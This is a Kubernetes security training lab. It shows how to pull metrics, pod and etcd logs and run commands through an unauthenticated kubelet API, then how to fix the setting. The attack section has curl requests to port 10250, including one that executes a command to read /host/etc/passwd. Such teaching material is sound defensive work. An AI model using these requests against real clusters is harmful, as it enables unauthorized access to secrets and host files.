# Kubelet

## Attack

Before fixing the kubelet we will try to get sensitive data via the kubelet.

### Getting sensitive data from the kubelet

```bash
# exit the VM - for being in the Github Codespaces VM again
exit

# store the external IP of the worker node - you can get the public ip address of your training VM via the file ssh-config
cat ssh-config
export IP=<EXTERNAL-IP-OF-TRAINING-VM>
echo $IP

# getting metrics from the kubelet
curl -k https://$IP:10250/metrics

# getting log infos from the kubelet
curl -k https://$IP:10250/logs/pods/ | grep etcd

# getting logs from etcd eg `curl -k https://$IP:10250/logs/pods/kube-system_etcd-kubernetes-security_87a0e13f2b523002a1f9bd2decbc296d/etcd/0.log`
curl -k https://$IP:10250/logs/pods/<ETCD_POD>/etcd/0.log

# getting infos from the host
curl -XPOST -k https://$IP:10250/run/default/my-suboptimal-pod/my-ubuntu -d "cmd=cat /host/etc/passwd"
```

## Avoiding the Attack

Detect the misconfiguration

```bash
# ssh to the training vm again

# take a loog at kubelets auth configurations
cat /var/lib/kubelet/config.yaml | grep -A10 authentication
```

### Fix Kubelet Configuration

Adapt the kubelet config according the following

```yaml
authentication:
  anonymous:
    enabled: true # <= change to false
```

```yaml
authorization:
  mode: AlwaysAllow # <= change to Webhook
```

```bash
# restart the kubelet
systemctl restart kubelet

# check if kubelet has started properly again
systemctl status kubelet

# exit the VM - for being in the Github Codespaces VM again
exit

# try to attack the kublet again - now you will get an `Unauthorized` response
curl -k https://$IP:10250/metrics

# ssh to the training vm again
```
